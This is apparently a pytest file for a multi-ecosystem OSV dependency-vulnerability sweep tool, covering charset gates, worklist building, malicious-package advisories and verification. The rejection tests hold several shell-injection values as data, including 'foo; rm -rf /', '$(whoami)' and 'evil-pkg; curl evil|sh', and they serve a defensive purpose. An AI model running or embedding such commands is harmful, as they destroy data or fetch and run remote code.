"""Tests for harnessing/3-audit/dependency-watch/scripts/fleet_sweep.py — the
multi-ecosystem OSV fleet sweep.

Loaded via importlib (it lives under harnessing/, not scripts/). NO
network: every OSV call is routed through an injected fake `post=`.
Security focus (assessment 2026-07-31 H1): package names/versions flow
into generated argv command arrays, so the charset gates must stay
strict and the worklist must remain argv-array-only.
"""

import importlib.util
import json
import sqlite3
import sys
from pathlib import Path

from traust.paths import skill_dir

_SPEC = importlib.util.spec_from_file_location(
    "fleet_sweep", skill_dir("dependency-watch") / "scripts" / "fleet_sweep.py"
)
fs = importlib.util.module_from_spec(_SPEC)
sys.modules["fleet_sweep"] = fs
_SPEC.loader.exec_module(fs)


# --------------------------------------------------------------------------
# pairs_from_graph — per-ecosystem grouping from depends_on edges
# --------------------------------------------------------------------------


def _seed_db(tmp_path: Path) -> Path:
    db = tmp_path / "graph.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE edges (src TEXT, dst TEXT, rel TEXT, attrs TEXT)")
    con.executemany(
        "INSERT INTO edges (src, dst, rel, attrs) VALUES (?, ?, ?, ?)",
        [
            # Go edge: dst module:<path>, no ecosystem attr, version attr,
            # and NO manifest attr (Go provenance is implicitly go.mod)
            ("repo:a", "module:golang.org/x/net", "depends_on", '{"version": "v0.1.0"}'),
            # npm scoped edge: dst pkg:npm/@scope/x, ecosystem attr present,
            # plus source-manifest provenance on the edge
            (
                "repo:b",
                "pkg:npm/@scope/x",
                "depends_on",
                '{"version": "1.2.3", "ecosystem": "npm", '
                '"manifest": ["services/api/package.json"]}',
            ),
            # a non-depends_on edge must be ignored
            ("repo:a", "repo:b", "imports", "{}"),
            # a versionless depends_on edge must be dropped
            ("repo:c", "module:example.com/novers", "depends_on", "{}"),
        ],
    )
    con.commit()
    con.close()
    return db


def test_pairs_from_graph_groups_by_ecosystem(tmp_path):
    grouped, prov = fs.pairs_from_graph(_seed_db(tmp_path))
    assert set(grouped) == {"Go", "npm"}
    assert grouped["Go"] == {("golang.org/x/net", "v0.1.0"): {"repo:a"}}
    # scoped npm name preserved verbatim (split only on the FIRST '/')
    assert grouped["npm"] == {("@scope/x", "1.2.3"): {"repo:b"}}
    # versionless row dropped
    assert all("novers" not in name for eco in grouped.values() for (name, _v) in eco)
    # source-manifest provenance carried from the edge attr, kept per-repo
    assert prov["npm"][("@scope/x", "1.2.3")] == {"repo:b": ["services/api/package.json"]}
    # Go edge had no manifest attr -> no prov entry (implicit go.mod)
    assert "Go" not in prov


# --------------------------------------------------------------------------
# OSV_ECOSYSTEM — internal tag -> OSV canonical name
# --------------------------------------------------------------------------


def test_osv_ecosystem_map():
    assert fs.OSV_ECOSYSTEM["pypi"] == "PyPI"
    assert fs.OSV_ECOSYSTEM["cargo"] == "crates.io"
    assert fs.OSV_ECOSYSTEM["ruby"] == "RubyGems"
    assert fs.OSV_ECOSYSTEM["nuget"] == "NuGet"
    assert fs.OSV_ECOSYSTEM["Go"] == "Go"
    assert fs.OSV_ECOSYSTEM["npm"] == "npm"
    # GitHub Actions uses OSV's exact ecosystem string
    assert fs.OSV_ECOSYSTEM["actions"] == "GitHub Actions"


# --------------------------------------------------------------------------
# actions ecosystem — owner/repo names, tag/SHA/major-tag versions
# --------------------------------------------------------------------------


def test_name_ok_actions_owner_repo():
    assert fs._name_ok("actions", "actions/checkout")
    assert fs._name_ok("actions", "step-security/harden-runner")
    # must still be a two-part owner/repo, argv-hostile-safe
    assert not fs._name_ok("actions", "actions")  # no repo part
    assert not fs._name_ok("actions", "actions/checkout; rm -rf /")


def test_version_ok_actions_tag_sha_major():
    assert fs._version_ok("actions", "v4")  # v-style major
    assert fs._version_ok("actions", "v4.2.1")  # full tag
    assert fs._version_ok("actions", "a" * 40)  # 40-hex-ish sha
    assert fs._version_ok("actions", "08eba0b27e820071cde6df949e0beb9ba4906955")  # real sha
    assert not fs._version_ok("actions", "$(id)")


# --------------------------------------------------------------------------
# charset gates — argv-hostile-safe, per ecosystem
# --------------------------------------------------------------------------


def test_name_ok_accepts_legal_names():
    assert fs._name_ok("npm", "@scope/pkg")
    assert fs._name_ok("npm", "lodash")
    assert fs._name_ok("maven", "group:artifact")
    assert fs._name_ok("Go", "golang.org/x/net")
    assert fs._name_ok("pypi", "requests")
    assert fs._name_ok("cargo", "serde_json")


def test_name_ok_rejects_hostile_names():
    for eco in ("npm", "pypi", "maven", "Go", "cargo", "ruby", "nuget"):
        assert not fs._name_ok(eco, "foo; rm -rf /")
        assert not fs._name_ok(eco, "foo $(x)")
        assert not fs._name_ok(eco, "a b")
        assert not fs._name_ok(eco, "foo`id`")
        assert not fs._name_ok(eco, "foo|bar")
    # bare "@" is not a legal scoped npm name
    assert not fs._name_ok("npm", "@")
    # unknown ecosystem fails closed
    assert not fs._name_ok("cocoapods", "AFNetworking")
    assert not fs._name_ok(None, "anything")


def test_version_ok():
    assert fs._version_ok("pypi", "1!2.3")  # PEP 440 epoch
    assert fs._version_ok("maven", "1.0.0.Final")  # maven qualifier
    assert fs._version_ok("npm", "1.0.0-rc.1")  # prerelease
    assert fs._version_ok("Go", "v1.2.3")
    assert not fs._version_ok("pypi", "1.0.0; echo")
    assert not fs._version_ok("npm", "1.0.0 && id")
    assert not fs._version_ok("Go", "$(whoami)")


# --------------------------------------------------------------------------
# _post_batch payload — Go strips leading 'v', others do not
# --------------------------------------------------------------------------


def test_build_batch_body_go_strips_leading_v():
    body = fs._build_batch_body([("golang.org/x/net", "v0.1.0")], "Go")
    q = body["queries"][0]
    assert q["package"] == {"name": "golang.org/x/net", "ecosystem": "Go"}
    assert q["version"] == "0.1.0"


def test_build_batch_body_npm_keeps_version_verbatim():
    # OSV canonical name for npm is "npm"; a leading-v-looking token must
    # NOT be stripped for non-Go ecosystems.
    body = fs._build_batch_body([("@scope/x", "v1.2.3")], "npm")
    q = body["queries"][0]
    assert q["package"]["ecosystem"] == "npm"
    assert q["version"] == "v1.2.3"


# --------------------------------------------------------------------------
# query_osv_multi + build_worklist — end to end with an injected fake post
# --------------------------------------------------------------------------

_NPM_VULN = {
    "id": "GHSA-scope-0001",
    "aliases": ["CVE-2024-0001"],
    "summary": "Scoped npm package flaw",
    "database_specific": {"severity": "HIGH"},
    "affected": [
        {
            "package": {"name": "@scope/x", "ecosystem": "npm"},
            "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "1.2.4"}]}],
        }
    ],
}


def _fake_post_hit(chunk, ecosystem):
    """Return an OSV batch result that flags every queried pair."""
    return [{"vulns": [{"id": _NPM_VULN["id"]}]} for _ in chunk]


def test_query_osv_multi_tags_ecosystem():
    pairs_by_eco = {"npm": {("@scope/x", "1.2.3"): {"repo:b"}}}
    hits = fs.query_osv_multi(pairs_by_eco, jobs=1, post=_fake_post_hit)
    assert set(hits) == {"GHSA-scope-0001"}
    assert hits["GHSA-scope-0001"]["ecosystem"] == "npm"
    assert hits["GHSA-scope-0001"]["pairs"] == {("@scope/x", "1.2.3")}


def test_build_worklist_npm_scoped_row_argv():
    pairs_by_eco = {"npm": {("@scope/x", "1.2.3"): {"repo:b"}}}
    hits = fs.query_osv_multi(pairs_by_eco, jobs=1, post=_fake_post_hit)
    by_cve = fs.dedupe_by_cve({_NPM_VULN["id"]: _NPM_VULN})
    rows, rejected = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["HIGH"], deep_cap=100
    )
    assert rejected == []
    assert len(rows) == 1
    row = rows[0]
    assert row["ecosystem"] == "npm"
    cmd = row["commands"][0]
    argv = cmd["impact_argv"]
    # argv-array-only discipline (H1): must be a list, never a string
    assert isinstance(argv, list)
    assert not isinstance(argv, str)
    # ecosystem threads into the impact command
    assert "--ecosystem" in argv
    assert argv[argv.index("--ecosystem") + 1] == "npm"
    # scoped name is preserved and passed as its own argv element
    assert "--module" in argv
    assert argv[argv.index("--module") + 1] == "@scope/x"
    # no argv element smuggles shell metacharacters
    for tok in argv:
        assert isinstance(tok, str)
        assert not any(c in tok for c in ";|&`$\n")


def test_build_worklist_hostile_name_rejected_no_argv():
    hostile = "@scope/x; rm -rf /"
    vuln = {
        "id": "GHSA-hostile-1",
        "aliases": ["CVE-2024-9999"],
        "summary": "hostile",
        "database_specific": {"severity": "CRITICAL"},
        "affected": [
            {
                "package": {"name": hostile, "ecosystem": "npm"},
                "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}],
            }
        ],
    }
    pairs_by_eco = {"npm": {(hostile, "1.0.0"): {"repo:z"}}}
    hits = {"GHSA-hostile-1": {"ecosystem": "npm", "pairs": {(hostile, "1.0.0")}}}
    by_cve = fs.dedupe_by_cve({vuln["id"]: vuln})
    rows, rejected = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["CRITICAL"], deep_cap=100
    )
    # no runnable row is produced for the hostile input
    assert rows == []
    # but it is surfaced (never silently dropped), tagged with ecosystem
    assert len(rejected) == 1
    assert rejected[0]["ecosystem"] == "npm"
    assert rejected[0]["module"] == hostile
    assert rejected[0]["reason"] == "module charset"


def test_build_worklist_carries_manifest_provenance(tmp_path):
    """A worklist row/command carries the source-manifest provenance field
    sourced from the edge's `manifest` attr (seeded sqlite db, no network:
    OSV is an injected fake `post=`)."""
    db = _seed_db(tmp_path)
    pairs_by_eco, prov_by_eco = fs.pairs_from_graph(db)
    npm_pairs = {"npm": pairs_by_eco["npm"]}
    hits = fs.query_osv_multi(npm_pairs, jobs=1, post=_fake_post_hit)
    by_cve = fs.dedupe_by_cve({_NPM_VULN["id"]: _NPM_VULN})
    rows, rejected = fs.build_worklist(
        by_cve,
        hits,
        npm_pairs,
        min_rank=fs.SEV_RANK["HIGH"],
        deep_cap=100,
        prov_by_eco={"npm": prov_by_eco["npm"]},
    )
    assert rejected == []
    assert len(rows) == 1
    row = rows[0]
    # row-level provenance rollup: {module: {repo: [manifest paths]}}
    assert row["manifest"] == {"@scope/x": {"repo:b": ["services/api/package.json"]}}
    # command-level provenance, per-repo, straight from the edge attr
    cmd = row["commands"][0]
    assert cmd["module"] == "@scope/x"
    assert cmd["manifest"] == {"repo:b": ["services/api/package.json"]}
    # provenance is metadata only — never smuggled into the impact argv
    assert "services/api/package.json" not in cmd["impact_argv"]


# --------------------------------------------------------------------------
# MAL- / CVE-less advisories — the Shai-Hulud blind spot
# --------------------------------------------------------------------------

# A malicious-package advisory: MAL- id, NO CVE alias, NO CVSS severity,
# and (as is typical for malware) NO fixed version in the range events.
_MAL_VULN = {
    "id": "MAL-2025-0001",
    "aliases": [],  # no CVE
    "summary": "malicious npm package (worm)",
    "database_specific": {"type": "MALWARE"},
    "affected": [
        {
            "package": {"name": "evil-pkg", "ecosystem": "npm"},
            "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}],  # no 'fixed'
        }
    ],
}

# A GHSA advisory with NO CVE alias (not malware, but CVE-less).
_GHSA_NO_CVE = {
    "id": "GHSA-cccc-dddd-eeee",
    "aliases": [],
    "summary": "npm flaw with no CVE assigned",
    "database_specific": {"severity": "HIGH"},
    "affected": [
        {
            "package": {"name": "quiet-pkg", "ecosystem": "npm"},
            "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "2.0.1"}]}],
        }
    ],
}


def test_display_id_and_malicious_helpers():
    # CVE alias present -> display id is the CVE (existing behavior)
    assert fs.display_id(_NPM_VULN["id"], _NPM_VULN) == "CVE-2024-0001"
    # no CVE -> display id is the OSV id itself, never dropped
    assert fs.display_id(_MAL_VULN["id"], _MAL_VULN) == "MAL-2025-0001"
    assert fs.display_id(_GHSA_NO_CVE["id"], _GHSA_NO_CVE) == "GHSA-cccc-dddd-eeee"
    # malware detection: MAL- prefix OR explicit malware type
    assert fs.is_malicious(_MAL_VULN["id"], _MAL_VULN)
    assert fs.is_malicious("MAL-2099-9", {})  # prefix alone
    assert fs.is_malicious("GHSA-x", {"affected": [{"ecosystem_specific": {"malicious": True}}]})
    # a plain GHSA / CVE advisory is NOT force-promoted to malware
    assert not fs.is_malicious(_NPM_VULN["id"], _NPM_VULN)
    assert not fs.is_malicious(_GHSA_NO_CVE["id"], _GHSA_NO_CVE)


def test_sev_band_malicious_is_critical():
    # malware has no CVSS -> CRITICAL regardless of database_specific
    assert fs.sev_band(_MAL_VULN, malicious=True) == "CRITICAL"
    assert fs.sev_band({}, malicious=True) == "CRITICAL"
    # non-malicious with no severity stays UNKNOWN (never crashes)
    assert fs.sev_band({}) == "UNKNOWN"


def test_dedupe_keeps_cve_less_advisories():
    # keying used to be CVE-only, which dropped these two entirely
    by = fs.dedupe_by_cve(
        {
            _MAL_VULN["id"]: _MAL_VULN,
            _GHSA_NO_CVE["id"]: _GHSA_NO_CVE,
            _NPM_VULN["id"]: _NPM_VULN,
        }
    )
    assert "MAL-2025-0001" in by
    assert "GHSA-cccc-dddd-eeee" in by
    # the CVE-aliased record is keyed by its CVE, as before
    assert "CVE-2024-0001" in by


def test_malicious_row_produced_top_critical():
    pairs_by_eco = {"npm": {("evil-pkg", "1.0.0"): {"repo:x"}}}
    hits = {"MAL-2025-0001": {"ecosystem": "npm", "pairs": {("evil-pkg", "1.0.0")}}}
    by_cve = fs.dedupe_by_cve({_MAL_VULN["id"]: _MAL_VULN})
    rows, rejected = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["CRITICAL"], deep_cap=100
    )
    assert rejected == []
    assert len(rows) == 1
    row = rows[0]
    # a row IS produced despite no CVE and no fixed version
    assert row["id"] == "MAL-2025-0001"
    assert row["cve"] is None
    assert row["osv"] == "MAL-2025-0001"
    assert row["malicious"] is True
    assert row["severity"] == "CRITICAL"
    argv = row["commands"][0]["impact_argv"]
    # the display (MAL-) id is the positional, ecosystem threads through
    assert "MAL-2025-0001" in argv
    assert argv[argv.index("--ecosystem") + 1] == "npm"
    # no fixed version -> no --fixed-version, flagged all versions
    assert "--fixed-version" not in argv
    for tok in argv:
        assert not any(c in tok for c in ";|&`$\n")


def test_malicious_row_sorts_to_top():
    # a malicious CRITICAL vs a plain CRITICAL CVE -> malicious first
    plain = {
        "id": "GHSA-plain-crit",
        "aliases": ["CVE-2024-7777"],
        "summary": "plain critical",
        "database_specific": {"severity": "CRITICAL"},
        "affected": [
            {
                "package": {"name": "plain-pkg", "ecosystem": "npm"},
                "ranges": [{"events": [{"fixed": "9.9.9"}]}],
            }
        ],
    }
    pairs_by_eco = {"npm": {("evil-pkg", "1.0.0"): {"repo:x"}, ("plain-pkg", "1.0.0"): {"repo:y"}}}
    hits = {
        "MAL-2025-0001": {"ecosystem": "npm", "pairs": {("evil-pkg", "1.0.0")}},
        "GHSA-plain-crit": {"ecosystem": "npm", "pairs": {("plain-pkg", "1.0.0")}},
    }
    by_cve = fs.dedupe_by_cve({_MAL_VULN["id"]: _MAL_VULN, plain["id"]: plain})
    rows, _ = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["CRITICAL"], deep_cap=100
    )
    assert len(rows) == 2
    assert rows[0]["malicious"] is True
    assert rows[0]["id"] == "MAL-2025-0001"


def test_ghsa_without_cve_row_uses_ghsa_id():
    pairs_by_eco = {"npm": {("quiet-pkg", "1.0.0"): {"repo:q"}}}
    hits = {"GHSA-cccc-dddd-eeee": {"ecosystem": "npm", "pairs": {("quiet-pkg", "1.0.0")}}}
    by_cve = fs.dedupe_by_cve({_GHSA_NO_CVE["id"]: _GHSA_NO_CVE})
    rows, rejected = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["HIGH"], deep_cap=100
    )
    assert rejected == []
    assert len(rows) == 1
    # not dropped for lacking a CVE — keyed/displayed by the GHSA id
    assert rows[0]["id"] == "GHSA-cccc-dddd-eeee"
    assert rows[0]["cve"] is None
    assert rows[0]["malicious"] is False
    assert rows[0]["severity"] == "HIGH"
    argv = rows[0]["commands"][0]["impact_argv"]
    assert "GHSA-cccc-dddd-eeee" in argv
    # has a fixed version, so a real remediation target is present
    assert argv[argv.index("--fixed-version") + 1] == "2.0.1"


def test_ghsa_with_cve_alias_display_id_is_cve():
    pairs_by_eco = {"npm": {("@scope/x", "1.2.3"): {"repo:b"}}}
    hits = fs.query_osv_multi(pairs_by_eco, jobs=1, post=_fake_post_hit)
    by_cve = fs.dedupe_by_cve({_NPM_VULN["id"]: _NPM_VULN})
    rows, _ = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["HIGH"], deep_cap=100
    )
    assert len(rows) == 1
    assert rows[0]["id"] == "CVE-2024-0001"
    assert rows[0]["cve"] == "CVE-2024-0001"
    assert rows[0]["osv"] == "GHSA-scope-0001"


def test_malicious_hostile_name_rejected_no_argv():
    hostile = "evil-pkg; curl evil|sh"
    vuln = {
        "id": "MAL-2025-9999",
        "aliases": [],
        "summary": "malware, hostile name",
        "database_specific": {"type": "malware"},
        "affected": [
            {
                "package": {"name": hostile, "ecosystem": "npm"},
                "ranges": [{"events": [{"introduced": "0"}]}],
            }
        ],
    }
    pairs_by_eco = {"npm": {(hostile, "1.0.0"): {"repo:z"}}}
    hits = {"MAL-2025-9999": {"ecosystem": "npm", "pairs": {(hostile, "1.0.0")}}}
    by_cve = fs.dedupe_by_cve({vuln["id"]: vuln})
    rows, rejected = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["CRITICAL"], deep_cap=100
    )
    # even a malicious advisory with a hostile name yields NO argv row
    assert rows == []
    assert len(rejected) == 1
    assert rejected[0]["module"] == hostile
    assert rejected[0]["reason"] == "module charset"
    assert rejected[0]["malicious"] is True


# --------------------------------------------------------------------------
# docker/helm are graph-only — never OSV-queried by the sweep entrypoint
# --------------------------------------------------------------------------


def _seed_db_with_graph_only(tmp_path: Path) -> Path:
    db = tmp_path / "graph2.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE edges (src TEXT, dst TEXT, rel TEXT, attrs TEXT)")
    con.executemany(
        "INSERT INTO edges (src, dst, rel, attrs) VALUES (?, ?, ?, ?)",
        [
            (
                "repo:a",
                "pkg:npm/lodash",
                "depends_on",
                '{"version": "4.17.20", "ecosystem": "npm"}',
            ),
            (
                "repo:b",
                "pkg:docker/nginx",
                "depends_on",
                '{"version": "1.25", "ecosystem": "docker"}',
            ),
            (
                "repo:c",
                "pkg:helm/ingress-nginx",
                "depends_on",
                '{"version": "4.9.0", "ecosystem": "helm"}',
            ),
        ],
    )
    con.commit()
    con.close()
    return db


class _RecordingPost:
    """Injectable fake OSV post that records the ecosystems it is asked
    to query and returns zero vulns (so no network _fetch_vuln runs)."""

    def __init__(self):
        self.ecosystems = []

    def __call__(self, chunk, ecosystem):
        self.ecosystems.append(ecosystem)
        return [{} for _ in chunk]


def test_sweep_all_skips_docker_helm(tmp_path, capsys):
    db = _seed_db_with_graph_only(tmp_path)
    out = tmp_path / "wl.json"
    rec = _RecordingPost()
    rc = fs.main(["--graph-db", str(db), "--out", str(out), "--ecosystem", "all"], post=rec)
    assert rc == 0
    # OSV was queried for npm only — never for the graph-only ecosystems
    assert "npm" in rec.ecosystems
    assert "docker" not in rec.ecosystems
    assert "helm" not in rec.ecosystems
    err = capsys.readouterr().err
    assert "graph-only" in err
    doc = json.loads(out.read_text())
    assert "npm" in doc["ecosystems"]
    assert "docker" not in doc["ecosystems"]
    assert "helm" not in doc["ecosystems"]
    assert set(doc["graph_only_ecosystems"]) == {"docker", "helm"}


def test_sweep_explicit_docker_helm_queries_nothing(tmp_path, capsys):
    db = _seed_db_with_graph_only(tmp_path)
    out = tmp_path / "wl2.json"
    rec = _RecordingPost()
    rc = fs.main(["--graph-db", str(db), "--out", str(out), "--ecosystem", "docker,helm"], post=rec)
    assert rc == 0
    # explicitly asking for the graph-only pair OSV-queries nothing
    assert rec.ecosystems == []
    assert "graph-only" in capsys.readouterr().err
    doc = json.loads(out.read_text())
    assert doc["ecosystems"] == []
    assert set(doc["graph_only_ecosystems"]) == {"docker", "helm"}


# --------------------------------------------------------------------------
# --verify auto-verification — refuted malicious hits move out of the
# actionable worklist (injected verify, no network)
# --------------------------------------------------------------------------

# A malicious advisory for the aliased-name false-positive class.
_MAL_ALIAS = {
    "id": "MAL-2025-7001",
    "aliases": [],
    "summary": "malicious npm package matched via a local alias name",
    "database_specific": {"type": "MALWARE"},
    "affected": [
        {
            "package": {"name": "legacy-swc-helpers", "ecosystem": "npm"},
            "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}],
        }
    ],
}


def _mal_row_with_provenance():
    """A single malicious worklist row carrying source-manifest provenance
    on its edge (built through build_worklist, no network)."""
    pairs_by_eco = {"npm": {("legacy-swc-helpers", "0.4.14"): {"repo:acme/app"}}}
    hits = {"MAL-2025-7001": {"ecosystem": "npm", "pairs": {("legacy-swc-helpers", "0.4.14")}}}
    prov = {
        "npm": {("legacy-swc-helpers", "0.4.14"): {"repo:acme/app": ["services/api/package.json"]}}
    }
    by_cve = fs.dedupe_by_cve({_MAL_ALIAS["id"]: _MAL_ALIAS})
    rows, rejected = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["CRITICAL"], deep_cap=100, prov_by_eco=prov
    )
    assert rejected == []
    assert len(rows) == 1
    return rows, hits


def test_verify_worklist_moves_refuted_malicious_hit():
    rows, hits = _mal_row_with_provenance()
    calls = []

    def fake_verify(repo_id, eco, package, version, paths):
        calls.append((repo_id, eco, package, version, tuple(paths)))
        return {
            "status": "refuted",
            "evidence": f"{package} only an npm alias to @swc/helpers@0.4.14",
            "manifest": paths[0],
        }

    kept, refuted = fs.verify_worklist(rows, hits, verify=fake_verify)
    # the false positive is removed from the actionable worklist...
    assert kept == []
    # ...and preserved with its paper trail in refuted_findings
    assert len(refuted) == 1
    r = refuted[0]
    assert r["verification"]["status"] == "refuted"
    assert "@swc/helpers" in r["verification"]["evidence"]
    # verify was called with the recorded per-repo provenance
    assert calls == [
        ("repo:acme/app", "npm", "legacy-swc-helpers", "0.4.14", ("services/api/package.json",))
    ]


def test_verify_worklist_keeps_confirmed_hit():
    rows, hits = _mal_row_with_provenance()
    kept, refuted = fs.verify_worklist(
        rows,
        hits,
        verify=lambda *a: {"status": "confirmed", "evidence": "declared for real", "manifest": "p"},
    )
    assert refuted == []
    assert len(kept) == 1
    assert kept[0]["verification"]["status"] == "confirmed"


def test_verify_worklist_no_provenance_is_unverifiable_and_kept():
    # Same malicious hit but NO manifest provenance: verify must NOT run and
    # the hit stays actionable (fail-safe — never dropped for lack of data).
    pairs_by_eco = {"npm": {("legacy-swc-helpers", "0.4.14"): {"repo:acme/app"}}}
    hits = {"MAL-2025-7001": {"ecosystem": "npm", "pairs": {("legacy-swc-helpers", "0.4.14")}}}
    by_cve = fs.dedupe_by_cve({_MAL_ALIAS["id"]: _MAL_ALIAS})
    rows, _ = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["CRITICAL"], deep_cap=100
    )
    called = []
    kept, refuted = fs.verify_worklist(
        rows, hits, verify=lambda *a: called.append(a) or {"status": "refuted"}
    )
    assert refuted == []
    assert len(kept) == 1
    assert kept[0]["verification"]["status"] == "unverifiable"
    assert called == []  # no manifest -> no fetch attempted


def test_verify_worklist_passes_non_malicious_rows_through():
    pairs_by_eco = {"npm": {("@scope/x", "1.2.3"): {"repo:b"}}}
    hits = fs.query_osv_multi(pairs_by_eco, jobs=1, post=_fake_post_hit)
    by_cve = fs.dedupe_by_cve({_NPM_VULN["id"]: _NPM_VULN})
    rows, _ = fs.build_worklist(
        by_cve, hits, pairs_by_eco, min_rank=fs.SEV_RANK["HIGH"], deep_cap=100
    )
    kept, refuted = fs.verify_worklist(
        rows, hits, verify=lambda *a: {"status": "refuted"}
    )  # would move IF consulted
    # a plain (non-malicious) CVE row is never auto-verified/dropped
    assert refuted == []
    assert len(kept) == 1
    assert "verification" not in kept[0]


# --------------------------------------------------------------------------
# Shared OSV client: unanswered lookups are counted, never read as clean
# --------------------------------------------------------------------------


class _FailingClient:
    """Shared-client fake: every lookup fails as unreachable."""

    def query_batch(self, queries):
        from collections import Counter

        from traust_engine.osv import BatchOutcome

        return BatchOutcome([None] * len(queries), Counter({"unreachable": len(queries)}))

    def get_vulns(self, ids):
        from collections import Counter

        return {}, Counter()


def test_query_osv_multi_counts_unanswered_pairs():
    from collections import Counter

    issues, unanswered = Counter(), []
    hits = fs.query_osv_multi(
        {"npm": {("@scope/x", "1.2.3"): {"repo:b"}}},
        jobs=1,
        client=_FailingClient(),
        issues=issues,
        unanswered=unanswered,
    )
    assert hits == {}
    assert issues == {"unreachable": 1}
    assert unanswered == [("npm", "@scope/x", "1.2.3")]


def test_no_pair_answered_is_a_failed_sweep_exit_2(tmp_path, capsys):
    db = _seed_db_with_graph_only(tmp_path)
    out = tmp_path / "wl-failed.json"
    rc = fs.main(
        ["--graph-db", str(db), "--out", str(out), "--ecosystem", "all"], client=_FailingClient()
    )
    assert rc == 2
    doc = json.loads(out.read_text())
    assert doc["status"] == "failed"
    assert doc["failure"]["status"] == "unreachable"
    assert doc["pairs_unanswered"] == doc["pairs_queried"] > 0
    assert doc["worklist"] == []
    assert "NOT a clean sweep" in capsys.readouterr().err


def _seed_two_npm_pairs(tmp_path: Path) -> Path:
    db = tmp_path / "graph3.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE edges (src TEXT, dst TEXT, rel TEXT, attrs TEXT)")
    con.executemany(
        "INSERT INTO edges (src, dst, rel, attrs) VALUES (?, ?, ?, ?)",
        [
            (
                "repo:a",
                "pkg:npm/lodash",
                "depends_on",
                '{"version": "4.17.20", "ecosystem": "npm"}',
            ),
            (
                "repo:b",
                "pkg:npm/left-pad",
                "depends_on",
                '{"version": "1.3.0", "ecosystem": "npm"}',
            ),
        ],
    )
    con.commit()
    con.close()
    return db


class _HalfClient(_FailingClient):
    """The first lookup answers (no advisories); the rest fail as unreachable."""

    def query_batch(self, queries):
        from collections import Counter

        from traust_engine.osv import BatchOutcome

        ids = [[]] + [None] * (len(queries) - 1)
        return BatchOutcome(ids, Counter({"unreachable": len(queries) - 1}))


def test_some_pairs_unanswered_is_a_degraded_sweep_exit_3(tmp_path, capsys):
    out = tmp_path / "wl-degraded.json"
    rc = fs.main(
        ["--graph-db", str(_seed_two_npm_pairs(tmp_path)), "--out", str(out)], client=_HalfClient()
    )
    assert rc == 3
    doc = json.loads(out.read_text())
    assert doc["status"] == "degraded"
    assert doc["pairs_unanswered"] == 1
    assert doc["lookup_issues"] == {"unreachable": 1}
    assert doc["unanswered_pairs"]
    assert "NOT clean" in capsys.readouterr().err


def test_a_failed_probe_stops_the_sweep(tmp_path):
    class Down(_FailingClient):
        def probe(self, query):
            return "unreachable", "URLError reaching https://osv.test/v1/query"

        def query_batch(self, queries):  # pragma: no cover - must not be reached
            raise AssertionError("a failed probe must stop the sweep")

    out = tmp_path / "wl.json"
    rc = fs.main(
        ["--graph-db", str(_seed_two_npm_pairs(tmp_path)), "--out", str(out)], client=Down()
    )
    assert rc == 2
    assert json.loads(out.read_text())["failure"]["detail"].startswith("URLError")


def test_air_gapped_access_does_not_sweep(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(fs, "osv_access", lambda: "air-gapped")
    monkeypatch.setattr(
        fs, "_default_client", lambda jobs: (_ for _ in ()).throw(AssertionError("no API"))
    )
    out = tmp_path / "wl.json"
    rc = fs.main(["--graph-db", str(_seed_two_npm_pairs(tmp_path)), "--out", str(out)])
    assert rc == 2
    doc = json.loads(out.read_text())
    assert doc["status"] == "failed"
    assert doc["failure"]["status"] == "air-gapped"


def test_a_complete_sweep_says_so(tmp_path):
    db = _seed_db_with_graph_only(tmp_path)
    out = tmp_path / "wl-ok.json"
    assert fs.main(["--graph-db", str(db), "--out", str(out)], post=_RecordingPost()) == 0
    doc = json.loads(out.read_text())
    assert doc["status"] == "complete"
    assert doc["pairs_unanswered"] == 0


def _spans_vuln(vid, name, *events, severity="HIGH"):
    return {
        "id": vid,
        "aliases": [],
        "summary": "multi-span flaw",
        "database_specific": {"severity": severity},
        "affected": [
            {
                "package": {"name": name, "ecosystem": "npm"},
                "ranges": [{"type": "SEMVER", "events": list(events)}],
            }
        ],
    }


def _one_row(vuln, pairs):
    pairs_by_eco = {"npm": {p: {f"repo:{p[1]}"} for p in pairs}}
    hits = {vuln["id"]: {"ecosystem": "npm", "pairs": set(pairs)}}
    rows, rejected = fs.build_worklist(
        fs.dedupe_by_cve({vuln["id"]: vuln}),
        hits,
        pairs_by_eco,
        min_rank=fs.SEV_RANK["HIGH"],
        deep_cap=100,
    )
    assert rejected == []
    (row,) = rows
    (cmd,) = row["commands"]
    return cmd


def test_fix_follows_each_installed_span():
    vuln = _spans_vuln(
        "GHSA-span-span-span",
        "two-lines",
        {"introduced": "0"},
        {"fixed": "1.5.0"},
        {"introduced": "2.0.0"},
        {"fixed": "2.3.0"},
    )
    # only 1.x installed: the 1.x fix, not the record's last one
    cmd = _one_row(vuln, [("two-lines", "1.2.0")])
    argv = cmd["impact_argv"]
    assert argv[argv.index("--fixed-version") + 1] == "1.5.0"
    assert argv[argv.index("--vulnerable-range") + 1] == "< 1.5.0"
    assert cmd["fix_available"] is True
    # 1.x and 2.x installed: one command carrying the highest fix
    cmd = _one_row(vuln, [("two-lines", "1.2.0"), ("two-lines", "2.1.0")])
    argv = cmd["impact_argv"]
    assert argv[argv.index("--fixed-version") + 1] == "2.3.0"
    assert cmd["fixed_by_version"] == {"1.2.0": "1.5.0", "2.1.0": "2.3.0"}


def test_unfixed_advisory_produces_a_no_fix_row():
    # previously dropped: a CVSS advisory with no fixed version made no row
    vuln = _spans_vuln(
